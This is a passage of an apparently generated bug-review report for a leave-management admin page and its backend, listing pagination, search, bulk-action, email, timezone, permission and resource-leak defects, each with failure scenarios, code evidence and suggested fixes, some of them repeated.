if (selectedDate && isStudyLeave) { params.submittedDate = selectedDate; }
else if (selectedDate) { params.date = selectedDate; }   // no date param when cleared
```
fetchStats:
```js
if (isStudyLeave && selectedDate) { params.submittedDate = selectedDate; }
else if (!isStudyLeave) { params.date = selectedDate || new Date().toISOString().split("T")[0]; }
```
```

**Fix:** Mirror the list logic exactly in fetchStats: only set `params.date = selectedDate` when `selectedDate` is truthy, and send no date param when it has been cleared.

## [HIGH] Pagination page is never clamped after a refetch, stranding the admin on a permanently empty page
`frontend/src/pages/AdminLeaveManagement.jsx:146` · *logic-error*

**What's wrong:** `setPagination(response.pagination)` blindly stores the server-echoed page (which is just `floor(skip/limit)+1`, never validated against `totalPages`). When approving/denying shrinks the result set below the current page's offset, the page number stays out of range. The pagination controls only render when `pagination.totalPages > 1` (line 1245), so once `totalPages` drops to 1 while `page` is 2, the Previous/Next buttons disappear and there is no way to get back to page 1.

**Failure:** 11 pending short-leave requests exist. Admin goes to page 2 (shows 1 request) and approves it. `fetchLeaveRequests` refetches with `page: 2` -> backend `skip=10, limit=10` returns `[]` with `total: 10, totalPages: 1, page: 2`. The UI renders the empty state "No short leave requests found" and hides the pagination bar because `1 > 1` is false. The admin is stuck on an empty page 2 and believes all requests are cleared, while 10 pending requests sit on page 1.

**Evidence:**
```
```js
setLeaveRequests(sortedRequests);
setPagination(response.pagination);   // line 146 — page taken verbatim from server
```
```jsx
{pagination.totalPages > 1 && (   // line 1245 — controls vanish when totalPages === 1
```
Backend (services/leaveRequestService.js:489-492): `page: options.skip ? Math.floor(options.skip / (options.limit || 10)) + 1 : 1`
```

**Fix:** After receiving the response, clamp the page: `const p = response.pagination; if (p.totalPages > 0 && p.page > p.totalPages) { setPagination({...p, page: p.totalPages}); return; } setPagination(p);` — or always render the pagination bar when `pagination.page > 1`.

## [HIGH] Search only filters the 10 records on the current page but reports a global result count
`frontend/src/pages/AdminLeaveManagement.jsx:519` · *logic-error*

**What's wrong:** `filteredRequests` filters `leaveRequests`, which holds only the current server page (`limit: pagination.limit` = 10, line 122). The search query is never sent to the backend and `pagination.page` is not reset when `searchQuery` changes, so the search silently drops every record that is not on the currently loaded page. The result banner at line 955-961 ("N results found" / "No results found") presents this page-local subset as if it were the full search result.

**Failure:** There are 60 pending short-leave requests. Intern "Nimal Silva" has a request that lives on page 4. Admin (on page 1) types "Nimal" into the search box labelled "Search by Intern ID, Name, or NIC...". The UI shows "No results found" and the empty state, so the admin concludes no such request exists and denies the intern's follow-up query — even though the request is pending on page 4.

**Evidence:**
```
```js
const filteredRequests = searchQuery.trim()
  ? leaveRequests.filter((request) => { ... })   // leaveRequests = current page only
  : leaveRequests;
```
```js
const params = { page: pagination.page, limit: pagination.limit, requestType };  // limit 10
```
```

**Fix:** Send the search term to `/leave-requests/all` as a server-side query param (add a name/traineeId/nationalId regex filter in leaveRequestRepository.findAll), reset `pagination.page` to 1 on search change, and debounce the input. At minimum, label the result count as "on this page".

## [HIGH] Bulk approve/deny reports success even when every single update failed
`frontend/src/pages/AdminLeaveManagement.jsx:346` · *error-handling*

**What's wrong:** `bulkUpdateLeaveRequestStatus` in the backend swallows per-request failures into an `errors` array and always returns HTTP 200 with `{ data: { updated, errors, details } }` (backend/controllers/leaveRequestController.js:389-417). The frontend never inspects `response.data.errors` and builds the success toast from `selectedRequests.size` instead of `response.data.updated`, so a completely failed batch renders as a green success message.

**Failure:** Admin selects 5 pending requests and bulk-approves. Another admin already reviewed all 5 seconds earlier, or the mongo write fails, so the service throws for each id and the controller returns `{ data: { updated: 0, errors: 5 } }` with status 200. The frontend shows "Successfully approved 5 request(s)" in green, clears the selection and closes the modal. The requests are still Pending. Admin walks away believing the batch was processed.

**Evidence:**
```
```js
const response = await bulkUpdateLeaveRequestStatus(requestsArray, {...});
toast.success(
  `Successfully ${bulkAction === "approve" ? "approved" : "denied"} ${selectedRequests.size} request(s)...`
);
```
Backend always 200s:
```js
res.status(200).json({ success: true, data: { updated: updatedRequests.length, errors: errors.length, details: ... } });
```
```

**Fix:** Use `response.data.updated` for the count and surface partial/complete failure: `if (response.data.errors > 0) toast.error(`${response.data.errors} request(s) failed`, {id: toastId}) else toast.success(...)`.

## [HIGH] Approve/Deny never emails the intern — populate selects Trainee_Email but code reads intern.email
`backend/services/leaveRequestService.js:611` · *api-contract/field-name-mismatch*

**What's wrong:** Every approve/deny from this page (single, quick action, and bulk) ends in `leaveRequestService.updateLeaveRequestStatus` -> `notifyInternStatusUpdate(leaveRequest)`. That function reads `leaveRequest.intern?.email`, but the document was populated by `leaveRequestRepository.updateStatus` with `.populate("intern", "Trainee_Name Trainee_ID Trainee_Email")` and the Intern model (backend/models/Intern.js:58) has no `email` field at all — only `Trainee_Email`. So `internEmail` is always undefined, the function logs a warning and returns, and the status-update email is never sent. The failure is swallowed (the catch only console.errors) so the admin UI still shows "Leave request approved successfully".

**Failure:** Admin opens /admin/study-leave-requests, clicks Review -> Approve on a pending extended-leave request. UI toasts "Leave request approved successfully"; server logs "Intern email not available for notification"; the intern never receives the approval/denial email and only discovers the decision by logging in.

**Evidence:**
```
leaveRequestService.js:611 `const internEmail = leaveRequest.intern?.email;` then `if (!internEmail) { console.warn("Intern email not available for notification"); return; }`
leaveRequestRepository.js:151 `.populate("intern", "Trainee_Name Trainee_ID Trainee_Email")`
models/Intern.js:58 `Trainee_Email: { type: String, default: "" },`  (no `email` field)
```

**Fix:** Use `const internEmail = leaveRequest.intern?.Trainee_Email || leaveRequest.intern?.email;` (and keep `Trainee_Email` in the populate). Also surface send failures instead of only console.warn.

## [HIGH] "Select All" ignores the active search box and selects every pending request server-wide
`frontend/src/pages/AdminLeaveManagement.jsx:281` · *data-integrity/destructive-action*

**What's wrong:** `handleSelectAll` issues its own `getAllLeaveRequests({ limit: 10000, requestType, status: "Pending", date/submittedDate })` and selects every returned _id. It deliberately ignores both the current page AND `searchQuery`, while the table body renders `filteredRequests` (the search-filtered current page). The select-all control (line 1037 desktop / 1016 mobile) is rendered whenever `filter === "Pending"`, including while a search is active, so the checkbox that appears to mean "select the rows I can see" actually selects records the admin has never seen. The subsequent bulk Approve/Deny then mutates all of them.

**Failure:** Admin types "Nimal" in the search box, the table narrows to 1 row, admin clicks the select-all checkbox in the table header and then "Approve Selected" -> "Confirm Approve". All 250 pending short-leave requests in the system are approved (passTokens generated, statuses written), not just Nimal's one row.

**Evidence:**
```
const params = { limit: 10000, requestType, status: "Pending" };  // no search term, no page (line 289-293)
const allIds = response.data.filter(r => r.status === "Pending").map(r => r._id); setSelectedRequests(new Set(allIds));  (line 303-307)
vs. `<tbody>` renders `filteredRequests.map(...)` (line 1076) where filteredRequests is the search-filtered list (line 519).
```

**Fix:** Hide/disable the select-all control while `searchQuery.trim()` is non-empty, or restrict it to `filteredRequests.map(r => r._id)`; at minimum pass the search term to the backend so the selection matches what is displayed.

## [MEDIUM] Bulk-action loading toast is never dismissed when the request throws, leaving a permanent spinner
`frontend/src/pages/AdminLeaveManagement.jsx:363` · *error-handling*

**What's wrong:** `toastId` is declared with `const` inside the `try` block (line 337), so it is out of scope in the `catch`. The catch calls `toast.error("Failed to process bulk action")` without `{ id: toastId }`, so the `toast.loading` toast — which react-hot-toast gives an infinite duration — is never replaced or dismissed. It stays pinned on screen for the rest of the session.

**Failure:** Admin selects 8 requests and bulk-approves while the network is down (or the backend 500s). The modal shows a red "Failed to process bulk action" toast, and next to it a spinner toast "Processing 8 request(s)..." that never goes away. On every subsequent failed bulk action another orphaned spinner stacks up, eventually covering the screen.

**Evidence:**
```
```js
try {
  const requestsArray = Array.from(selectedRequests);
  const toastId = toast.loading(`Processing ${selectedRequests.size} request(s)...`);  // line 337, block-scoped
  ...
} catch (error) {
  console.error("Error in bulk action:", error);
  toast.error("Failed to process bulk action");   // line 363 — no { id: toastId }
}
```
```

**Fix:** Hoist `const toastId = toast.loading(...)` above the `try` (as `handleDownloadApprovedReport` and `handleSelectAll` already do) and pass `{ id: toastId }` in the catch.

## [MEDIUM] 403 redirect check compares against the wrong message string, so an inactive/non-admin session never redirects
`frontend/src/pages/AdminLeaveManagement.jsx:153` · *permissions-auth*

**What's wrong:** The catch block tests `error.message === "Admin access required"`, but `requireAdmin` in backend/middleware/adminAuth.js:7 responds with `"Admin access required."` (trailing period) and `ACCOUNT_INACTIVE` responds with a completely different string. The leaveRequestApi layer throws `error.response.data`, so `error.message` is the middleware's string. The equality never holds, so the redirect branch is dead code. The controller-level check that does return the period-less string (leaveRequestController.js:161) is unreachable because `requireAdmin` runs first.

**Failure:** A super-admin deactivates an operational admin's account while that admin has the Short Leave page open. The admin changes the date filter; the request 403s with `{ message: "Admin account is inactive or unavailable.", code: "ACCOUNT_INACTIVE" }`. Instead of being told and sent to /admin-login, they just see a generic "Failed to load leave requests" toast and an empty table, and keep retrying against a permanently dead session.

**Evidence:**
```
Frontend:
```js
if (error.message === "Admin access required") {
  toast.error("Admin access required. Redirecting to admin login...");
  setTimeout(() => navigate("/admin-login"), 1500);
  return;
}
```
backend/middleware/adminAuth.js:7
```js
return res.status(403).json({ message: "Admin access required.", code: "ADMIN_REQUIRED" });
```
backend/middleware/adminAuth.js:11
```js
return res.status(403).json({ message: "Admin account is inactive or unavailable.", code: "ACCOUNT_INACTIVE" });
```
```

**Fix:** Switch on the machine-readable code instead of the human string: `if (["ADMIN_REQUIRED", "ACCOUNT_INACTIVE"].includes(error.code)) { ... }`, and surface `error.message` for `FORBIDDEN`.

## [MEDIUM] UTC-based "today" shifts the default date filter and the Today/Urgent badges back one day for Sri Lanka users before 05:30
`frontend/src/pages/AdminLeaveManagement.jsx:76` · *date-timezone*

**What's wrong:** `new Date().toISOString().split("T")[0]` yields the **UTC** calendar date, but it is used everywhere as the local Sri Lanka (UTC+05:30) today: the initial `selectedDate` (line 76), the requestType-switch reset (line 97), the stats fallback date (line 174), the report date (line 372), `isUrgentRequest` (line 456), `isToday` (line 462), the "(Today)" suffix in `formatSelectedDate` (line 507) and the "View Today's Pending" button (line 1000). Between 00:00 and 05:29 Sri Lanka time the UTC date is still the previous day.

**Failure:** An admin opens /admin/leave-requests at 02:00 on 5 Aug in Colombo. `new Date().toISOString().split("T")[0]` returns "2026-08-04", so the date picker is pre-filled with 4 Aug and the table lists yesterday's short-leave requests while the label reads "Select Date". `formatSelectedDate()` then appends "(Today)" to 4 Aug. Requests actually dated 5 Aug are hidden, and `isUrgentRequest` never fires for them so the red "Urgent" badge is missing on the day's real same-day requests.

**Evidence:**
```
```js
const [selectedDate, setSelectedDate] = useState(() => {
  return requestType === "study_leave" ? "" : new Date().toISOString().split("T")[0];
});
```
```js
const isUrgentRequest = (leaveDate) => {
  const today = new Date().toISOString().split("T")[0];
  const reqDate = new Date(leaveDate).toISOString().split("T")[0];
  return reqDate === today;
};
```
```

**Fix:** Add a local-date helper and use it in all eight places, e.g. `const localToday = (d = new Date()) => `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;`

## [MEDIUM] Switching between Short Leave and Extended Leave leaves the review/document modal open on a stale record from the other type
`frontend/src/pages/AdminLeaveManagement.jsx:91` · *react-state*

**What's wrong:** Both routes render the same `AdminLeaveManagement` element at the same position inside `<Routes>` (AppRoutes.jsx:158-165), so React reuses the component instance and preserves state — which is exactly why the render-phase reset block at lines 91-101 exists. That block resets the list, stats, filter, pagination, date, selection and search, but it does **not** reset `selectedRequest`, `adminResponse`, `documentViewer`, `isBulkModalOpen` or `bulkAction`.

**Failure:** Admin is on /admin/leave-requests, opens the Review modal for a pending short-leave request, then clicks "Extended Leave Requests" in the sidebar. The page header switches to "Extended Leave Requests" but the modal stays open, titled "Extended Leave Request Details", still showing the short-leave record. Clicking Approve calls `updateLeaveRequestStatus` on the short-leave `_id` — the admin approves a short leave believing they approved an extended leave. The same happens with an open document viewer, which additionally keeps showing the previous type's proof document.

**Evidence:**
```
```js
if (requestType !== prevRequestType) {
  setPrevRequestType(requestType);
  setLeaveRequests([]);
  setStats({ total: 0, pending: 0, approved: 0, denied: 0 });
  setFilter("Pending");
  setPagination({ page: 1, limit: 10, total: 0, totalPages: 0 });
  setSelectedDate(requestType === "study_leave" ? "" : new Date().toISOString().split("T")[0]);
  setSelectedRequests(new Set());
  setIsSelectAll(false);
  setSearchQuery("");
  // selectedRequest / documentViewer / adminResponse / isBulkModalOpen never reset
}
```
```

**Fix:** Add `setSelectedRequest(null); setAdminResponse(""); setIsBulkModalOpen(false); setBulkAdminResponse("");` and revoke + clear `documentViewer` inside the same block — or give the route element a `key={requestType}` in AppRoutes so React remounts it.

## [MEDIUM] "Select all" ignores the active search query and selects every pending request across all pages
`frontend/src/pages/AdminLeaveManagement.jsx:301` · *data-integrity*

**What's wrong:** `handleSelectAll` issues its own `getAllLeaveRequests({ limit: 10000, requestType, status: "Pending", ...date })` and selects every returned `_id`. It does not apply `searchQuery`, and the checkbox it is bound to sits in the table header directly above a search-filtered list, so the visual affordance is "select the rows I can see".

**Failure:** Admin types "Nimal" into the search box; the table narrows to one visible row. Admin clicks the header select-all checkbox to tick that row. A toast reads "Selected 143 pending requests", the bulk bar shows 143, and clicking "Approve Selected" then confirming mass-approves 143 unrelated pending short-leave requests for that date.

**Evidence:**
```
```js
const params = { limit: 10000, requestType, status: "Pending" };
if (selectedDate && isStudyLeave) { params.submittedDate = selectedDate; }
else if (selectedDate) { params.date = selectedDate; }
const response = await getAllLeaveRequests(params);
const allIds = response.data.filter((r) => r.status === "Pending").map((r) => r._id);
setSelectedRequests(new Set(allIds));
```
No `searchQuery` is applied anywhere in this function.
```

**Fix:** When `searchQuery.trim()` is non-empty, select only `filteredRequests` ids (or pass the search term to the backend so the same predicate applies), and label the toast accordingly.

## [MEDIUM] Empty-state "Clear All Filters" and "View Today's Pending" buttons do not reset the page number
`frontend/src/pages/AdminLeaveManagement.jsx:989` · *logic-error*

**What's wrong:** Every other filter entry point resets `pagination.page` to 1 (the four stat cards at lines 681/719/757/795, the date input at 648/657, and the "Switch to Pending Default" button at 866). The two recovery buttons in the empty state are the exception — they change `selectedDate`/`filter` but leave `pagination.page` at its stale value, which is precisely the state the admin is in when they need these buttons.

**Failure:** Admin is on page 4 of "All" requests, switches the date to one that has only 3 requests, and lands on the empty state. They click "Clear All Filters & Reset to Pending": `selectedDate` becomes "" and `filter` becomes "Pending", but the effect refires with `page: 4`. If fewer than 31 pending requests exist, the response is empty again and the same empty state re-renders — the button appears to do nothing. "View Today's Pending" behaves identically.

**Evidence:**
```
```jsx
<button onClick={() => { setSelectedDate(""); setFilter("Pending"); }}>
  Clear All Filters & Reset to Pending
</button>
...
<button onClick={() => { setSelectedDate(new Date().toISOString().split("T")[0]); setFilter("Pending"); }}>
  View Today's Pending
</button>
```
Compare line 866: `setFilter("Pending"); setPagination((prev) => ({ ...prev, page: 1 }));`
```

**Fix:** Add `setPagination((prev) => ({ ...prev, page: 1 })); setSelectedRequests(new Set()); setIsSelectAll(false);` to both handlers.

## [MEDIUM] "Send Gate Email" button is gated on leave.manage but the endpoint requires interns.manage
`frontend/src/pages/AdminLeaveManagement.jsx:619` · *permissions-auth*

**What's wrong:** The button renders when `canManageLeave` is true, i.e. `role !== "supervisor" && hasAdminPermission("leave.manage")`. It posts to `/admin/trigger/approved-short-leave-email`, and adminRoutes mounts `enforceRoutePermission` globally (backend/routes/adminRoutes.js:91); `routePermission` maps any `/trigger/` path to `"interns.manage"` (backend/middleware/adminAuth.js:36). Since `User.permissions` is an arbitrary subset of ALL_PERMISSIONS (backend/models/User.js:18, adminUserController.js:57), an admin can legitimately hold `leave.manage` without `interns.manage`.

**Failure:** A super-admin creates an operational admin with permissions `["dashboard.view","leave.view","leave.manage"]`. That admin opens /admin/leave-requests, sees the green "Send Gate Email" button, confirms the window.confirm prompt, and gets a red toast "Permission required: interns.manage" with no email sent. The action is visibly offered but can never succeed for this account.

**Evidence:**
```
Frontend gate:
```js
const canManageLeave = currentAdmin?.role !== "supervisor" && hasAdminPermission("leave.manage");
...
{!isStudyLeave && canManageLeave && (
  <button onClick={handleTriggerApprovedShortLeaveEmail} ...>Send Gate Email</button>
)}
```
backend/middleware/adminAuth.js:36
```js
if (path.includes("issue-certificate") || path.startsWith("/sync/") || path.startsWith("/trigger/")) return "interns.manage";
```
```

**Fix:** Either add `&& hasAdminPermission("interns.manage")` to the button's render condition, or (preferred) special-case `/trigger/approved-short-leave-email` in `routePermission` to require `"leave.manage"` so the permission matches the feature.

## [MEDIUM] Approved-leave PDF download is unreachable dead code, and would export short-leave data on the Extended Leave page
`frontend/src/pages/AdminLeaveManagement.jsx:369` · *file-export*

**What's wrong:** `handleDownloadApprovedReport` is defined (and `downloadApprovedLeaveReport` is imported at line 10) but is never referenced by any JSX element — grepping the file returns only the import and the definition. The PDF report feature is therefore completely inaccessible from the UI. Separately, the call omits `requestType` and the backend's `getApprovedLeavesByDate` hardcodes `requestType: "short_leave"` (backend/services/leaveRequestService.js:179-185), so if the button were wired up it would produce a short-leave report on the Extended Leave page.

**Failure:** An admin needs the daily approved-short-leave PDF for the gate staff. There is no download button anywhere on the page, so the feature cannot be used at all — the only export path is the separate 1:30 PM scheduled email. If the button is later added to the shared header, clicking it from /admin/study-leave-requests silently produces a PDF titled "Approved Short Leave Requests Report" containing short-leave rows, not extended leave.

**Evidence:**
```
Only two references in the whole file:
```js
import { downloadApprovedLeaveReport, adminApi } from "../api/adminApi";   // line 10
const handleDownloadApprovedReport = async () => { ... }                   // line 369
```
Backend hardcodes the type:
```js
async getApprovedLeavesByDate(date) {
  return await leaveRequestRepository.findAll({ status: "Approved", date, requestType: "short_leave" });
}
```
```

**Fix:** Render the button (gated on `!isStudyLeave && hasAdminPermission("leave.view")`) next to "Send Gate Email", or delete the dead handler and import. If it is to work for both types, thread `requestType` through `downloadApprovedLeaveReport` -> `?requestType=` -> `getApprovedLeavesByDate`.

## [MEDIUM] fetchStats swallows errors silently, leaving all four stat cards showing 0 with no indication of failure
`frontend/src/pages/AdminLeaveManagement.jsx:184` · *error-handling*

**What's wrong:** `fetchStats`'s catch only `console.error`s — no toast, no error state, and `stats` is left at its initial `{total:0,pending:0,approved:0,denied:0}`. On the short-leave page `displayedStats` short-circuits to `stats` (line 531: `if (!isStudyLeave || ...) return stats`), so the fallback that exists for study leave does not apply and the zeros are rendered verbatim.

**Failure:** `/leave-requests/stats` times out or 500s (it fires four parallel `getAllLeaveRequests` queries, so it is the slowest endpoint on the page). The table loads normally with 12 pending short-leave rows, but all four cards read 0 and the chip reads "Pending Requests (0)". Nothing tells the admin the numbers failed to load; they report the dashboard as showing wrong data.

**Evidence:**
```
```js
} catch (error) {
  if (currentFetchId !== fetchIdRef.current) return;
  console.error("Error fetching stats:", error);   // line 184 — no user-facing signal
}
```
```js
const displayedStats = (() => {
  if (!isStudyLeave || stats.total > 0 || pagination.total === 0) { return stats; }
```
```

**Fix:** Track a `statsError` state, render a dash or a small retry affordance in the cards when it is set, and show a one-time toast ("Could not load leave statistics").

## [MEDIUM] Bulk approve/deny leaves a permanent "Processing N request(s)..." spinner toast when the call fails
`frontend/src/pages/AdminLeaveManagement.jsx:337` · *error-handling*

**What's wrong:** In `confirmBulkAction` the loading toast id is declared *inside* the try block (line 337), so the catch at line 361-364 cannot reference it. `toast.error("Failed to process bulk action")` creates a second, unrelated toast while the `toast.loading` toast (which has an infinite duration in react-hot-toast) is never dismissed. This is especially likely here because the backend loops sequentially over every id, awaiting an email send per record (leaveRequestController.js:392-405), so large bulk actions time out. Other handlers in this same file (`handleSelectAll` line 287, `handleDownloadApprovedReport` line 370) correctly hoist the toastId above the try.

**Failure:** Admin select-alls 250 pending requests and confirms Approve. The request exceeds the gateway timeout / the token expires; the catch fires. The screen shows both "Failed to process bulk action" and a spinning "Processing 250 request(s)..." toast that stays on screen until the page is reloaded, and the generic message hides the real server error.

**Evidence:**
```
try { const requestsArray = Array.from(selectedRequests); const toastId = toast.loading(`Processing ${selectedRequests.size} request(s)...`); ... } catch (error) { console.error(...); toast.error("Failed to process bulk action"); }
```

**Fix:** Hoist `const toastId = toast.loading(...)` above the try and pass `{ id: toastId }` in the catch: `toast.error(error.message || "Failed to process bulk action", { id: toastId })`.

## [MEDIUM] Bulk success toast reports the selected count and ignores per-record failures returned by the server
`frontend/src/pages/AdminLeaveManagement.jsx:347` · *error-handling/wrong-data*

**What's wrong:** The backend bulk endpoint updates ids one by one and returns `{ data: { updated, errors, details } }` (leaveRequestController.js:409-417) — individual failures are collected, not thrown. The frontend prints `selectedRequests.size` instead of `response.data.updated` and never inspects `response.data.errors`, so partial failures are reported as total success. (It even reads `response.data.updated` on the very next line for the email suffix, proving the correct field was available.)

**Failure:** Admin bulk-approves 50 requests; 6 of them were deleted by the interns a moment earlier so `updateStatus` returns null and the service throws "Leave request not found" for each. Server responds `{ updated: 44, errors: 6 }`. UI toasts "Successfully approved 50 request(s)" and the admin never learns 6 failed.

**Evidence:**
```
toast.success(`Successfully ${bulkAction === "approve" ? "approved" : "denied"} ${selectedRequests.size} request(s)${ !isStudyLeave && bulkAction === "approve" && response.data.updated > 0 ? " - Email notification sent!" : "" }`, { id: toastId });
```

**Fix:** Use `response.data.updated` for the count and add a warning toast when `response.data.errors > 0` (e.g. `toast.error(`${response.data.errors} request(s) failed`)`).

## [MEDIUM] Approving an extended leave writes the logbook records one day early (and misses the last day) on a UTC+5:30 server
`backend/services/leaveRequestService.js:71` · *date/timezone*

**What's wrong:** Approving from the study-leave page calls `syncApprovedStudyLeaveToLogbook`, which expands the range with `getStudyLeaveDates`. `leaveDate`/`studyEndDate` are stored as UTC midnight (created from a "YYYY-MM-DD" input string), but the helper does `start.setHours(0,0,0,0)` — *local* midnight — and then emits `cursor.toISOString().split("T")[0]`, i.e. the UTC day of a local-midnight instant. On any server east of UTC (Asia/Colombo, +5:30) that subtracts a day from every generated key. DailyRecord.date is a plain "YYYY-MM-DD" string (models/DailyRecord.js:13), so the upserts land on the wrong documents.

**Failure:** Server TZ = Asia/Colombo. Admin approves an extended leave for 2026-08-10 to 2026-08-12. `start` = 2026-08-10T00:00Z -> setHours(0,0,0,0) -> 2026-08-09T18:30Z -> key "2026-08-09". The loop upserts DailyRecords for 2026-08-09, 08-10, 08-11: a bogus 'Formal Extended Leave' record overwrites the intern's real 9 Aug logbook entry, and 12 Aug is never marked as leave so the intern shows as a non-submitter that day.

**Evidence:**
```
const start = new Date(leaveRequest.leaveDate); ... start.setHours(0, 0, 0, 0); ... while (cursor <= end) { dates.push(cursor.toISOString().split("T")[0]); cursor.setDate(cursor.getDate() + 1); }   (leaveRequestService.js:60-76)
await DailyRecord.findOneAndUpdate({ internId: ..., date }, { $set: {...} }, { upsert: true, ... })   (line 700-716)
```

**Fix:** Derive the key from UTC parts instead of local: use `start.setUTCHours(0,0,0,0)` / `cursor.setUTCDate(cursor.getUTCDate()+1)` (matching how leaveDate was stored), or format with `toLocaleDateString("en-CA", { timeZone: "UTC" })`.

## [LOW] Document blob URL is never revoked if the page unmounts with the viewer open
`frontend/src/pages/AdminLeaveManagement.jsx:215` · *file-export*

**What's wrong:** `URL.createObjectURL(blob)` is only revoked in `closeDocumentViewer` (line 234). There is no `useEffect` cleanup, so navigating away while the document viewer modal is open leaks the object URL and keeps the whole decoded file alive in memory for the lifetime of the tab. Proof documents are stored base64 in Mongo and can be multi-MB PDFs/images.

**Failure:** Admin opens the Review modal, clicks "View" on a 6 MB scanned PDF, then clicks "Dashboard" in the sidebar without pressing Close. The blob stays referenced. Repeating this a dozen times over a shift accumulates ~70 MB of unreleasable memory in the tab.

**Evidence:**
```
```js
const blob = await response.blob();
const fileUrl = URL.createObjectURL(blob);   // line 215
...
setDocumentViewer({ show: true, url: fileUrl, type: fileType, loading: false });
```
Revocation exists only here:
```js
const closeDocumentViewer = () => {
  if (documentViewer.url && documentViewer.url.startsWith("blob:")) { URL.revokeObjectURL(documentViewer.url); }
```
```

**Fix:** Add `useEffect(() => () => { if (documentViewer.url.startsWith("blob:")) URL.revokeObjectURL(documentViewer.url); }, [documentViewer.url]);` so the URL is revoked on unmount and on replacement.

## [LOW] Document viewer Download link has href="" while the document is loading and downloads the SPA page instead
`frontend/src/pages/AdminLeaveManagement.jsx:1696` · *file-export*

**What's wrong:** The footer `<a href={documentViewer.url} download>` is rendered unconditionally, outside the `documentViewer.loading` branch. During the fetch, `documentViewer.url` is `""`, and an empty `href` resolves to the current document URL; combined with the `download` attribute the browser saves the current page rather than the proof document. The link also carries no filename, so even after loading the saved file has a random blob name with no extension.

**Failure:** Admin clicks "View" on a proof document and immediately clicks "Download" in the footer while the spinner is still showing. The browser saves a file containing the TalentHub SPA HTML (named after the route, e.g. "leave-requests"), not the intern's proof document.

**Evidence:**
```
```jsx
<div className="flex justify-end gap-3 p-4 border-t border-gray-100 bg-white">
  <a href={documentViewer.url} download className="...">Download</a>   // line 1695-1701, rendered even when url === ""
```
```

**Fix:** Disable/hide the link while `documentViewer.loading || !documentViewer.url`, and set an explicit filename: `download={documentViewer.filename || "proof-document"}` (capture the filename from `selectedRequest.proofDocument.filename` when opening).

## [LOW] Search highlighting is case-sensitive while the filter is case-insensitive, so matched rows show no highlight
`frontend/src/pages/AdminLeaveManagement.jsx:561` · *logic-error*

**What's wrong:** `filteredRequests` lowercases both sides before comparing (`request.internName.toLowerCase().includes(q)` where `q = searchQuery.trim().toLowerCase()`), but `highlightMatch` is called with the raw `searchQuery.trim()` and does a literal `str.split(query)`. Whenever the typed case differs from the stored case the split finds nothing and the `<mark>` is never emitted.

**Failure:** Admin types "kamal" (lowercase). The row for "Kamal Perera" correctly appears because the filter is case-insensitive, but `"Kamal Perera".split("kamal")` returns `["Kamal Perera"]`, so no yellow highlight is rendered and the admin cannot see which field matched — the same applies to NIC letters (e.g. searching "v" against "901234567V").

**Evidence:**
```
Filter (case-insensitive):
```js
const q = searchQuery.trim().toLowerCase();
return (request.internName && request.internName.toLowerCase().includes(q)) || ...
```
Highlight (case-sensitive):
```js
const str = text.toString();
const parts = str.split(query);   // line 561 — raw-case query
```
```

**Fix:** Split case-insensitively, e.g. `const parts = str.split(new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")})`, "ig"))` and render the odd-index segments in `<mark>`, preserving the original casing.

## [LOW] isSelectAll desyncs from the actual selection when a row is individually unticked
`frontend/src/pages/AdminLeaveManagement.jsx:271` · *react-state*

**What's wrong:** `handleSelectRequest` mutates `selectedRequests` but never updates `isSelectAll`, and `isSelectAll` is the sole driver of the header checkbox icon (`FiCheckSquare` vs `FiSquare`, lines 1044-1048 and 1020-1024) and of the branch taken in `handleSelectAll` (line 282).

**Failure:** Admin clicks the header select-all ("Selected 40 pending requests"), then unticks two rows they do not want to approve — the header still renders as fully checked. Wanting to re-add them, the admin clicks the header checkbox: because `isSelectAll` is still `true`, the handler takes the deselect branch and wipes the entire 38-item selection instead of restoring all 40. The bulk bar disappears and the work must be redone.

**Evidence:**
```
```js
const handleSelectRequest = (requestId) => {
  const newSelected = new Set(selectedRequests);
  if (newSelected.has(requestId)) { newSelected.delete(requestId); } else { newSelected.add(requestId); }
  setSelectedRequests(newSelected);   // isSelectAll left untouched
};
```
```js
const handleSelectAll = async () => {
  if (isSelectAll) { setSelectedRequests(new Set()); setIsSelectAll(false); }
```
```

**Fix:** Set `isSelectAll` from the resulting set inside `handleSelectRequest` (e.g. `setIsSelectAll(false)` on any deselect), or derive the header state from `selectedRequests.size` rather than a separate boolean.

## [LOW] `attendance: "absent"` written on study-leave approval is silently discarded (field not in DailyRecordSchema)
`backend/services/leaveRequestService.js:712` · *data-integrity*

**What's wrong:** `syncApprovedStudyLeaveToLogbook` upserts DailyRecords with `$set: { stack, task, progress, blockers, status: "study_leave", attendance: "absent" }`. DailyRecordSchema (models/DailyRecord.js:3-50) has no `attendance` path, and Mongoose strict mode (the default) drops unknown paths from update payloads without error. The upserted document also never sets `traineeId`, which the schema defines and which other reports read.

**Failure:** Admin approves an extended leave. The created DailyRecord has status "study_leave" but no `attendance` field and no `traineeId`; any downstream report that filters/joins on `attendance === "absent"` or on `traineeId` treats the intern as neither present nor absent and omits them from the attendance figures.

**Evidence:**
```
$set: { stack: "Formal Extended Leave", ..., status: "study_leave", attendance: "absent" }   (leaveRequestService.js:706-713)
DailyRecordSchema fields: internId, traineeId, date, stack, task, progress, blockers, status   (models/DailyRecord.js:5-45 — no `attendance`)
```

**Fix:** Drop `attendance` from the $set (status "study_leave" already encodes it) or add the field to DailyRecordSchema; and populate `traineeId: leaveRequest.internTraineeId` in the upsert.

## [LOW] Document viewer: Download link points at an empty href while loading, and the blob URL leaks if the page unmounts
`frontend/src/pages/AdminLeaveManagement.jsx:1695` · *file-export/resource-leak*

**What's wrong:** The footer Download anchor is rendered unconditionally with `href={documentViewer.url}`, but during the fetch the state is `{ show: true, url: "", loading: true }` (line 190), so the anchor resolves to the current SPA URL. Clicking it navigates/reloads the app instead of downloading. Separately, `URL.createObjectURL(blob)` (line 215) is only revoked in `closeDocumentViewer` (line 232-237) — there is no unmount cleanup effect, so navigating away with the viewer open leaks the blob for the lifetime of the tab. The `download` attribute also has no filename value, so files save with a random blob name and no extension.

**Failure:** Admin clicks "View" on a proof document; while the spinner is still showing they click "Download" in the footer. The browser navigates to the current admin URL and the SPA reloads, losing the open review modal and the filter state.

**Evidence:**
```
<a href={documentViewer.url} download className="...">Download</a>   (line 1695-1701, rendered outside the `documentViewer.loading` conditional)
setDocumentViewer({ show: true, url: "", type: "", loading: true });   (line 190)
const fileUrl = URL.createObjectURL(blob);   (line 215) — revoked only in closeDocumentViewer
```

